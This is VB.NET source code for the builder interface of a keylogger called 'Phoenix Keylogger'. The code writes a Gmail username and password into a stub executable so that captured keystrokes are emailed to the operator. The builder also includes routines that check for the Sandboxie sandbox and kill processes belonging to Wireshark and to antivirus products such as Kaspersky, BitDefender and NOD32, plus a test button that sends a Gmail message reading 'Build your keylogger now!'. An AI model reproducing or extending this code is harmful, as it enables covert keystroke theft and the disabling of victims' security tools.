Imports System.IO
Imports System.Net.Mail
Public Class Form1

    Dim stub, text1, text2 As String
    Dim str As String = ""
    Const FileSplit = "@phoenix@"
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

        For Fadein = 0.0 To 1.1 Step 0.1
            Me.Opacity = Fadein
            Me.Refresh()
            Threading.Thread.Sleep(100)
        Next
    End Sub
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        MessageBox.Show(" Server has been created Succesfully ")
        Dim str As String
        str = TextBox3.Text
        text1 = TextBox1.Text
        text2 = TextBox2.Text
        If chkSandbox.Checked = True Then
            Sandboxie()
        End If

        If chkkeyscrambler.Checked = True Then
            AntiKeyscrambler()

        End If

        If chkwireshark.Checked = True Then
            AntiWireshark()
        End If

        If chkkaspersky.Checked = True Then
            AntiKaspersky()
        End If

        If chkbitdefender.Checked = True Then
            AntiBitDefender()
        End If
        If chkZonealarm.Checked = True Then
            AntiZoneAlarm()
        End If

        If chkAntiAnubis.Checked = True Then
            AntiAnubis()
        End If

        If chkNorman.Checked = True Then
            AntiNorman()
        End If
        If chkNod.Checked = True Then
            AntiNOD32()
        End If

        FileOpen(1, Application.StartupPath & "\Stub.exe", OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
        stub = Space(LOF(1))
        FileGet(1, stub)
        FileClose(1)
        If File.Exists(str) Then
            My.Computer.FileSystem.DeleteFile(str)
        End If
        FileOpen(1, Application.StartupPath & "\" & str, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        FilePut(1, stub & FileSplit & text1 & FileSplit & text2)
        FileClose(1)
    End Sub


    Private Sub Picturebox1_MouseHover(ByVal sender As Object, ByVal e As System.EventArgs) Handles PictureBox1.MouseHover
        PictureBox1.Hide()
        PictureBox2.Show()
    End Sub
    Private Sub Picturebox2_Mouseleave(ByVal sender As Object, ByVal e As System.EventArgs) Handles PictureBox2.MouseLeave
        PictureBox2.Hide()
        PictureBox1.Show()
    End Sub

    Private Sub PictureBox2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox2.Click
        Me.Close()
    End Sub

    Private Sub CheckBox1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox1.CheckedChanged
        If TextBox2.PasswordChar = "*" Then
            TextBox2.PasswordChar = Nothing
        ElseIf TextBox2.PasswordChar = Nothing Then
            TextBox2.PasswordChar = "*"
        End If

    End Sub
    Private Declare Function GetModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As Long

    Private Function Sandboxie() As Boolean
        Try
            If GetModuleHandle("SbieDll.dll") Then
                Return True
            End If
        Catch ex As Exception
        End Try
    End Function


    Sub AntiKeyscrambler()
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "keyscrambler"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub


    Sub AntiWireshark()
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "wireshark"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub


    Sub AntiKaspersky()
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "avp"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Sub AntiBitDefender()
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "bdagent"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Sub AntiZoneAlarm()
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "zlclient"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Sub AntiAnubis()
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "anubis"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Sub AntiNorman()
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "npfmsg"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Sub AntiNOD32()
        Dim generaldee As Process() = Process.GetProcesses
        Dim i As Integer
        For i = 0 To generaldee.Length - 1
            Select Case Strings.LCase(generaldee(i).ProcessName)
                Case "egui"
                    generaldee(i).Kill()
                Case Else
            End Select
        Next
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        AboutBox1.Show()
    End Sub

  
    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click

        Dim smtpServer As New SmtpClient()
        Dim mail As New MailMessage
        ProgressBar1.Value = 10
        smtpServer.Credentials = New Net.NetworkCredential(TextBox1.Text, TextBox2.Text)
        'using gmail
        ProgressBar1.Value = 20
        smtpServer.Port = 587
        smtpServer.Host = "smtp.gmail.com"
        ProgressBar1.Value = 35
        smtpServer.EnableSsl = True
        mail = New MailMessage
        ProgressBar1.Value = 50
        mail.From = New MailAddress(TextBox1.Text)
        mail.To.Add(TextBox1.Text)
        ProgressBar1.Value = 70
        mail.Subject = (" .:Phoenix Keylogger Test:. ")
        mail.Body = ("Testing Gmail was Successful.Build your keylogger now!")
        ProgressBar1.Value = 90
        smtpServer.Send(mail)
        ProgressBar1.Value = 100
        MsgBox("Message has been sent. Check your Gmail")

    End Sub

End Class
